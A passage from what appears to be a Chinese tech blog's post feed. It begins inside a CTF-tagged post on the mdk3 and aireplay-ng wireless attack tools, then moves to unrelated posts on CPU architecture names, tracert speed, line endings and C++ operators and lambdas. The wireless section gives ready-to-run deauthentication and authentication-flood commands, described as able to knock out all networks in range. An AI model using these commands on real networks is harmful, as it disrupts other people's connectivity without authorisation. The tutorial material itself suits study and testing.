#测试指定BSSID -m                     #使用有效数据库中的客户端mac地址 -c                    #对应 -a ，不检查是否测试成功 -i  &lt;ap_mac&gt;           #对指定BSSID进行智能攻击 -s &lt;pps&gt;               #速率，默认50<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用样例</p><pre class="line-numbers language-none"><code class="language-none">mdk3 mon0 a -a xx:xx:xx:xx:xx:xx -c -s 100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="deauthenticationdisassociation-amok">Deauthentication/DisassociationAmok</h3><p>强制解除验证解除连接！在这个模式下，软件会向周围所有可见AP发起循环攻击,可以造成一定范围内的无线网络瘫痪.//这是最好玩的模式</p><pre class="line-numbers language-none"><code class="language-none">mdk3 --help d #查看详细内容 -w &lt;filename&gt;                  #白名单mac地址列表文件 -b &lt;filename&gt;                  #黑名单mac地址列表文件 -s &lt;pps&gt;                       #速率 -c [chan,chan,chan,...]        #信道，可以多填，如 1,6,11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用样例</p><pre class="line-numbers language-none"><code class="language-none">mdk3 mon0 d -s 200 -c 1,6,11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>除了MDK3以外，aireplay-ng也能够实现Deauth攻击</p><p>-0的意思为采用Deauth攻击(使用-deauth同理)后跟的参数为发送Deauth包的数量； -a后的参数为目标AP的MAC地址</p><p>具体使用方法可用</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng –help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng --deauth 50 -a A8:57:4E:B5:2E:8A wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注意</strong>：aireplay-ng进行攻击如上时，只会在wlan0mon监听的信道内寻找目标，所以在进行攻击前，应先用</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>寻找目标mac与信道，然后将网卡监听信道调整到目标mac所在信道，</p><pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0 X(代表目标信道) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再执行攻击命令，否则会出现No such BSSID available</p><hr><h3 id="basic-probing-and-essid-bruteforce-mode">Basic probing and ESSIDBruteforce mode</h3><p>探测AP基本信息和ESSID猜解</p><pre class="line-numbers language-none"><code class="language-none">mdk3 --help p #查看详细信息-e &lt;ssid&gt;             #待检测的ssid-f &lt;filename&gt;          #检测AP设置为隐藏的ssid列表文件-t &lt;bssid&gt;               #用bssid检测AP的信息-s &lt;pps&gt;                 #速率，默认300-b &lt;character set&gt;         #设置字符集<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用样例</p><pre class="line-numbers language-none"><code class="language-none">mdk3 mon0 p -t xx:xx:xx:xx:xx:xx -s 100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 无线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>下载软件时x86,x64,amd64,i386等都是什么？</title>
      <link href="/2022/05/16/xia-zai-ruan-jian-shi-x86-x64-amd64-i386-deng-du-shi-shi-me/"/>
      <url>/2022/05/16/xia-zai-ruan-jian-shi-x86-x64-amd64-i386-deng-du-shi-shi-me/</url>
      
        <content type="html"><![CDATA[<h1 id="cpu架构指令集与系统">CPU、架构、指令集与系统</h1><h2 id="tldr">TL;DR</h2><p>x86-32 = 32位</p><p>x86-64 = 64位</p><p>x64 = x86-64 = amd64 = em64t = ia32e(i家改名部也是挺厉害的)</p><p>x86 = x86-32 + x86-64 (依语境)</p><p>x86 = x86-32 (依语境)</p><h2 id="cpu">CPU</h2><p>我们的CPU从原来的8位，16位，到现在的32位和64位。</p><p>CPU处理计算的时候“数据”和“指令”是不同对待的。</p><p>8位的CPU，一次只能处理一个8位的“数据”或者一个8位的"指令"。比如<code>00001101</code>.又比如：“<code>+1</code>”这个运算，你要先指示CPU做“+”，完成后再输入“1”数据给CPU。8位的CPU优点是设计简单，处理速度比较快。缺点就是：软件设计复杂，繁琐。不利于计算机的发展。</p><p>后来推出了16位的CPU，我们就可以一次处理两个字节（16位）的数据了，比如“加1”这个命令。“加”是一个指令，占用8个位，余下的8位我们可以存放数据“1”了。</p><p>32位的CPU就更加方便了，我们就可以一次处理一个a=a+b这样的命令了。</p><p>优点：简化了软件设计的复杂度缺点：硬件设计更加复杂，计算速度下降。</p><p>一般来讲32位的CPU对于我们来讲是最理性的CPU，对于软件开发来讲足够了。</p><p>但是2的32次方 = 4294967296bit = 4G左右很显然32位CPU只有4G左右的内存寻址空间，对于一些服务器来讲4G的内存的远远不够的了。我们需要更加大的内存寻址空间的话就需要对CPU进升级。64位CPU就这样诞生了。64位CPU的内存寻址空间是多少你算算看！呵呵。2的64次方（理论上）。</p><p>但是现在的AMD和Inter的64位CPU并不是真正意义上的64CPU，只是进行了部分64位的改进，比如64位的内存寻址等。要是真的全部都是64位的了，那么现在市场上的软件将全部被淘汰不能使用了~呵呵，想像一下会是什么样子。</p><p>目前主流CPU使用的64位技术主要有AMD公司的AMD64位技术、Intel公司的EM64T技术、和Intel公司的IA-64技术。其中IA-64是Intel独立开发，不兼容32位计算机，仅用于Itanium(安腾)以及后续产品Itanium2，人们习惯性地称它为“纯64位技术”。</p><h2 id="架构">架构</h2><ul><li><p>狭义的x86架构，指只支持32位的Intel/AMD/NVDIA的CPU，并向下兼容16位（实模式）；</p></li><li><p>狭义的x64架构，指的是支持32位和64位的Intel/AMDCPU，指令集与x86兼容，并向下兼容16位（实模式），目前绝大多数民用CPU和服务器CPU都是这样的；</p></li><li><p>狭义的ia64架构，指的是安腾系列的CPU，虽然指令集也是64位的，但不兼容32位，intel独有的，这种CPU比较少见，基本不生产了，近似于淘汰的状态；</p></li><li><p>广义的x86架构，泛指支持x86和x64架构Intel、AMD的CPU，但不包含ia64（安腾）。</p></li></ul><p>x86架构于1978年推出的Intel 8086中央处理器中首度出现，它是从Intel8008处理器中发展而来的，而8008则是发展自Intel 4004的。8086在三年后为IBMPC所选用，之后x86便成为了个人电脑的标准平台，成为了历来最成功的CPU架构。</p><p>其他公司也有制造x86架构的处理器，计有Cyrix（现为威盛电子所收购）、NEC集团、IBM、IDT以及Transmeta。Intel以外最成功的制造商为AMD，其早先产品Athlon系列处理器的市场份额仅次于IntelPentium。</p><p>8086是16位处理器；直到1985年32位的80386的开发，这个架构都维持是16位。接着一系列的处理器表示了32位架构的细微改进，推出了数种的扩展，直到2003年AMD对于这个架构发展了64位的扩展，并命名为AMD64。后来英特尔也推出了与之兼容的处理器，并命名为Intel64。两者一般被统称为x86-64或x64，开创了x86的64位时代。</p><p>值得注意的是英特尔早在1990年代就与惠普合作提出了一种用在安腾系列处理器中的独立的64位架构，这种架构被称为IA-64。IA-64是一种崭新的系统，和x86架构完全没有相似性；不应该把它与x86-64或x64弄混。</p><h2 id="系统">系统</h2><h3 id="位系统和32位系统的区别">64位系统和32位系统的区别</h3><p>操作系统只是硬件和应用软件中间的一个平台。</p><p>32位操作系统针对的32位的CPU设计。<br>64位操作系统针对的64位的CPU设计。</p><p>64位的操作系统针对64位CPU设计的，增加了一些64位的指令，但还是和32兼容的。对于普通用户来讲，64位系统意义不大。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 系统架构 </tag>
            
            <tag> CPU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么Windows下的tracert速度较慢</title>
      <link href="/2022/05/11/wei-shi-me-windows-xia-de-tracert-su-du-jiao-man/"/>
      <url>/2022/05/11/wei-shi-me-windows-xia-de-tracert-su-du-jiao-man/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么windows下的tracert速度较慢">为什么Windows下的tracert速度较慢</h1><p><strong>Windows</strong>下的 <code>tracert</code> 发送 <a href="http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/tracert.mspx?mfr=true">ICMPecho 请求</a>; 许多路由器和防火墙会直接 <code>DROP</code> 掉<code>tracert</code> 发出的ICMP echo请求。所以工具必须等待内部超时，然后才能宣布该路由超时。</p><p><strong>Linux</strong>下的 <code>traceroute</code> 发送 UDP 连接请求;路由此时会转发流量，因此Linux中的 <code>traceroute</code>较为可靠。这也意味着工具不必等待沿途大多数路由器的超时答复。</p><p>综上所述，Windows 中<code>tracert</code>在跃点之间会等待大约 1秒的时间。而 Linux<code>traceroute</code>不会在跃点之间停留。</p><p>同时 <code>tracert</code> 默认会进行 DNS反向名称查找（将IP解析为域名）。这可以为跟踪路由添加调试信息，但也很慢。</p><p>如果是Cisco 交换机/路由器，可以使用 <code>no ip domain-lookup</code>禁用。</p><p>可以加入 <code>-d -w 100</code> 以减少延迟</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tracert <span class="token parameter variable">-d</span> <span class="token parameter variable">-w</span> <span class="token number">100</span><span class="token parameter variable">-d</span> 阻止域名解析<span class="token parameter variable">-w</span> <span class="token number">100</span> 设置响应超时上限为100ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>traceroute</code> 一次会测试16个路由跃点，而<code>tracert</code>只能一次一个。</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回车和换行</title>
      <link href="/2022/05/10/hui-che-he-huan-xing/"/>
      <url>/2022/05/10/hui-che-he-huan-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="回车和换行">回车和换行</h1><h2 id="回车carriage-return">"回车"（carriage return）</h2><h2 id="换行line-feed">"换行"（line feed）</h2><p><img src="https://googles.plus/images/loading.gif" data-original="/images/Selectric_II.jpg"></p><p>在打字机中，换行和回车是两个不同的操作。<strong>"回车"（carriagereturn）</strong>负责将打字球送回最左端，<strong>"换行"（linefeed）</strong>负责将纸向上推一个行间距的距离。</p><h2 id="进入计算机时代">进入计算机时代</h2><p>在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model33）的玩意，每秒钟可以打10个字符。但是它有一个问题，就是打完一行换行的时候，要用去<strong>0.2</strong>秒，正好可以打两个字符。要是在这<strong>0.2</strong>秒里面，又有新的字符传过来，那么这个字符将丢失。</p><p>于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做"回车"，告诉打字机把打印头定位在左边界；另一个叫做"换行"，告诉打字机把纸向下移一行。</p><p>这就是"换行"和"回车"的来历，从它们的英语名字上也可以看出一二。</p><p>后来，计算机发明了，这两个概念也就被般到了计算机上。那时，存储器很贵，一些科学家认为在每行结尾加两个字符太浪费了，加一个就可以。于是，就出现了分歧。</p><p>Unix系统里，每行结尾只有"&lt;换行&gt;"，即"<code>\n</code>"；Windows系统里面，每行结尾是"&lt;回车&gt;&lt;换行&gt;"，即"<code>\r\n</code>"；Mac系统里，每行结尾是"&lt;回车&gt;"。一个直接后果是，Unix/Mac系统下的文件在Windows里打开的话，所有文字会变成一行；而Windows里的文件在Unix/Mac下打开的话，在每行的结尾可能会多出一个<code>^M</code>符号。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++中::和: .和-&gt;的作用和区别</title>
      <link href="/2022/05/10/c-zhong-he-he-de-zuo-yong-he-qu-bie/"/>
      <url>/2022/05/10/c-zhong-he-he-de-zuo-yong-he-qu-bie/</url>
      
        <content type="html"><![CDATA[<h2 id="符号和的作用和区别">符号<code>::和：</code>的作用和区别</h2><ul><li><p><code>::</code>是作用域运算符，<code>A::B</code>表示作用域<code>A</code>中的名称<code>B</code>，<code>A</code>可以是<strong>名字空间、类、结构</strong>；</p></li><li><ul><li><p>类作用域操作符“<code>::</code>”指明了成员函数所属的类。如：<code>M::f(s)</code>就表示<code>f(s)</code>是类<code>M</code>的成员函数。</p><p><em>作用域，如果想在类的外部引用静态成员函数，或在类的外部定义成员函数都要用到。使用命名空间里的类型或函数也要用到（如：<code>std::cout, std::cin, std::string</code>等等）</em></p></li></ul></li><li><ul><li></li><li>表示“域操作符”例：声明了一个类A，类A里声明了一个成员函数<code>void f()</code>，但没有在类的声明里给出f的定义，那么在类外定义f时，就要写成<code>void A::f()</code>，表示这个<code>f()</code>函数是类<code>A</code>的成员函数。</li><li>表示引用成员函数及变量，作用域成员运算符例：<code>System::Math::Sqrt()</code>相当于<code>System.Math.Sqrt()</code></li></ul></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>            <span class="token keyword">public</span><span class="token operator">:</span>                <span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token punctuation">{</span>                    std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"Test"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">//命名空间时使用::</span>                    <span class="token punctuation">}</span>            <span class="token keyword">private</span><span class="token operator">:</span>                <span class="token keyword">int</span> a<span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token class-name">Test</span><span class="token double-colon punctuation">::</span><span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment">//成员函数定义时使用::</span>            <span class="token punctuation">{</span><span class="token punctuation">}</span>            <span class="token class-name">Test</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//使用静态成员函数时用::</span>        ```<span class="token operator">-</span> ```：```一般用来表示继承；<span class="token number">1.</span> 表示机构内位域的定义（即该变量占几个bit空间）```C<span class="token operator">++</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_XXX</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> a<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>XXX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol type="1"><li>在构造函数后面，冒号起分割作用，是类给成员变量赋值的方法，初始化列表，更适用于成员变量的常量const型。</li></ol><pre class="line-numbers language-none"><code class="language-none">构造函数，就是与类同名的函数，它与普通函数的区别在于，它没有返回类型。在构造函数后面紧跟着冒号加初始化列表，各初始化变量之间以逗号(,)隔开。例如：class myClass{public :    myClass();// 构造函数，无返回类型，可以有参数列表，这里省去    ~myClass();// 析构函数    int a;    const int b;}myClass::myClass():a(1),b(1)// 初始化列表{}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于“：”冒号的用法的说明：</p><p>初始化列表的作用相当于在构造函数内进行相应成员变量的赋值，但两者是有差别的。在初始化列表中是对变量进行初始化，而在构造函数内是进行赋值操作。两都的差别在对于像const类型数据的操作上表现得尤为明显：const类型的变量必须在定义时进行初始化，而不能对const型的变量进行赋值，因此const类型的成员变量只能（而且必须）在初始化列表中进行初始化，如：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">myClass<span class="token double-colon punctuation">::</span>myClass（）<span class="token punctuation">{</span>    a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 没错，效果相当于在初始化列表中进行初始化</span>    b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 出错，const变量不能进行赋值操作；</span><span class="token punctuation">}</span><span class="token number">2</span><span class="token punctuation">)</span> 初始化的顺序与成员变量声名的顺序相同。先看一下下面的程序：myClass<span class="token double-colon punctuation">::</span><span class="token function">myClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样的执行结果a,b各是多少呢？<code>b=1,a=1</code>?不是，<code>b=1</code>而<code>a</code>是个随机数。这一点是相当重要，一般在初始化列表中进行初始化时，初始化的顺序应与声明的顺序保持一致，防止出现不必要的错误。</p><ol start="3" type="1"><li><p><code>public:</code>和<code>private:</code>后面的冒号，表示后面定义的所有成员都是公有或私有的，直到下一个"<code>public:</code>”或"<code>private:</code>”出现为止。"<code>private:</code>"为默认处理。</p></li><li><p>类名冒号后面的是用来定义类的继承。</p></li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> 派生类名 <span class="token operator">:</span> 继承方式 基类名<span class="token punctuation">{</span>派生类的成员<span class="token punctuation">}</span><span class="token punctuation">;</span>这里的冒号起到的就是声名基类的作用，在基类类名前面可以加<span class="token keyword">public</span><span class="token operator">/</span><span class="token keyword">private</span><span class="token operator">/</span><span class="token keyword">protected</span>等标签，用于标识继承的类型，也可以省略， 省略的话，用<span class="token keyword">class</span>定义的类默认为<span class="token keyword">private</span>，用<span class="token keyword">struct</span>定义的类默认为<span class="token keyword">public</span>。与初始化列表一样的，这里也可以声名多个基类，各基类之间用逗号<span class="token punctuation">(</span><span class="token punctuation">,</span><span class="token punctuation">)</span>隔开。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5" type="1"><li>条件语句(? :)与?构成条件语句，作用相当于<code>if else</code>，如下；</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>a<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>c<span class="token operator">=</span>a<span class="token operator">&gt;</span>b<span class="token operator">?</span>a<span class="token operator">:</span>b<span class="token punctuation">;</span><span class="token comment">// 如果a&gt;b成立，则反a赋给c，否则把b赋给c</span>条件语句的结构为：条件表达式<span class="token operator">?</span>表达式<span class="token number">1</span><span class="token operator">:</span>表达式<span class="token number">2</span>当条件表达式为<span class="token boolean">true</span>时，表达式的值为表达式<span class="token number">1</span>的值，否则为表达式<span class="token number">2</span>的值。注意：<span class="token number">1</span>）<span class="token operator">?</span><span class="token operator">:</span>可以嵌套，但不推荐使用（难懂），例如：<span class="token keyword">int</span> max <span class="token operator">=</span> i<span class="token operator">&gt;</span>j <span class="token operator">?</span> i<span class="token operator">&gt;</span>k <span class="token operator">?</span> i <span class="token operator">:</span> k <span class="token operator">:</span> j<span class="token operator">&gt;</span>k <span class="token operator">?</span> j <span class="token operator">:</span> k<span class="token punctuation">;</span><span class="token number">2</span>）<span class="token operator">?</span><span class="token operator">:</span>具有很低的优先级，例如：<span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> i<span class="token operator">&gt;</span>j<span class="token operator">?</span>i<span class="token operator">:</span>j<span class="token punctuation">;</span><span class="token comment">// 出错，&lt;&lt;比&gt;具有更高的优先级，执行顺序为 ((cout&lt;&lt;i)&gt;j)?i:j,相当于是比较cout&lt;&lt;i与j的大小，然后根据比较结果决定表达式值为i或j，这 显然要出错的，cout&lt;&lt;i的值是cout，不能跟整型数j进行比较。</span>cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i<span class="token operator">&gt;</span>j<span class="token punctuation">)</span><span class="token operator">?</span>i<span class="token operator">:</span>j<span class="token punctuation">;</span><span class="token comment">//输出1或0，相当于(cout&lt;&lt;(i&gt;j))作为判决条件，来决定表达式的值为i或j，而 cout&lt;&lt;(i&gt;j)，i&gt;j则输出1否则0，然后再将(cout&lt;&lt;(i&gt;j))作为？：的条件，如果 cout正确执行则为1（true），否则为0（false），以此决定表达式值为i或j</span>cout <span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>i<span class="token operator">&gt;</span>j<span class="token operator">?</span>i<span class="token operator">:</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//i&gt;j则输出i，否则输出j，表达式值为true如果cout正确执行，否则为false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6" type="1"><li>语句标签 通常跟<code>goto</code>配合使用，如：</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">step1<span class="token operator">:</span> a <span class="token operator">=</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">goto</span> step1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这种作法也不是很推荐，原因在于它破坏了语句的顺序执行;</p><ol start="7" type="1"><li>switch语句中<code>case</code>后。</li></ol><h2 id="符号.和-的作用和区别">符号<code>.和-&gt;</code>的作用和区别</h2><ul><li><code>A.B</code>则A为<strong>对象或者结构体</strong>；点号（<code>.</code>）：左边必须为实体。</li><li><code>A-&gt;B</code>则A为<strong>指针</strong>，<code>-&gt;</code>是成员提取，<code>A-&gt;B</code>是提取<code>A</code>中的<strong>成员</strong><code>B</code>，<code>A</code>只能是<strong>指向类、结构、联合的指针</strong>；箭头（<code>-&gt;</code>）：左边必须为<strong>指针</strong>；</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    A b<span class="token punctuation">;</span>    A <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>b<span class="token punctuation">;</span>    b<span class="token punctuation">.</span>a<span class="token punctuation">;</span> <span class="token comment">//类类型的对象访问类的成员</span>    p<span class="token operator">-&gt;</span>a<span class="token punctuation">;</span> <span class="token comment">//类类型的指针访问类的成员</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Lambda表达式</title>
      <link href="/2022/05/10/c-lambda-biao-da-shi/"/>
      <url>/2022/05/10/c-lambda-biao-da-shi/</url>
      
        <content type="html"><![CDATA[<p>利用Lambda表达式，可以方便的定义和创建匿名函数。Lambda表达式把函数看作对象。Lambda表达式可以像对象一样使用，比如可以将它们赋给变量和作为参数传递，还可以像函数一样对其求值。</p><p>当一个函数需要将另一个函数用作参数时，可以使用 Lambda。</p><h2 id="lambda表达式声明">lambda表达式声明</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">[</span>capture list<span class="token punctuation">]</span> <span class="token punctuation">(</span>params list<span class="token punctuation">)</span> <span class="token keyword">mutable</span> exception<span class="token operator">-&gt;</span> <span class="token keyword">return</span> type <span class="token punctuation">{</span> function body <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="含义说明">含义说明</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">capture list：捕获外部变量列表params list：形参列表mutable指示符：用来说用是否可以修改捕获的变量exception：异常设定return type：返回类型function body：函数体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="基本语法">基本语法</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> x <span class="token operator">&lt;</span> y <span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="例如">例如</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> m1 <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> <span class="token operator">&amp;</span>b<span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">mutable</span> <span class="token punctuation">{</span>        <span class="token keyword">auto</span> m2 <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">mutable</span> <span class="token punctuation">{</span>            std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>            a <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> b <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> c <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">m2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">m1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">// 调用 m2() 并打印 123</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> c <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span> <span class="token comment">// 打印 234</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="例2-外部变量">例2 外部变量</h3><p>Lambda表达式可以使用其可见范围内的外部变量，但必须明确声明（明确声明哪些外部变量可以被该Lambda表达式使用）。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> f <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token punctuation">{</span> cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span 